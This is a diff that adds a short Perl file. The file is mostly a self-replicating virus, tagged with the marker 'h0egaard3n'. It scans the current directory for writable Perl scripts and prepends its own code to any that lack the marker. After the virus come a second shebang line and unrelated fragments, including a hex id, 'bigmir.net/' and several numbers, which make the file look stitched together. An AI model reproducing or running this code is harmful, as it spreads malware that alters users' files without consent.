@@ -1,0 +1,27 @@
+#!/usr/bin/perl
+#h0egaard3n
+open(File,$0);
+@vx=<File>;
+close(File);
+foreach $Fichier (<*>){
+if ((-f $Fichier) && (-r $Fichier) && (-w $Fichier)){
+open(File, "$Fichier");
+@Temp=<File>;
+close(File);
+if (@Temp[0] =~ "/perl"){
+if (@Temp[1] ne "\#h0egaard3n\n"){
+open(File, ">$Fichier");
+print File @vx[0 .. 16];
+print File @Temp;
+close (File);
+}}}}
+#!/usr/bin/perl
+U
+63a85681
+bigmir.net/
+1024
+3450839680
+30163920
+1914378272
+29796793
+*
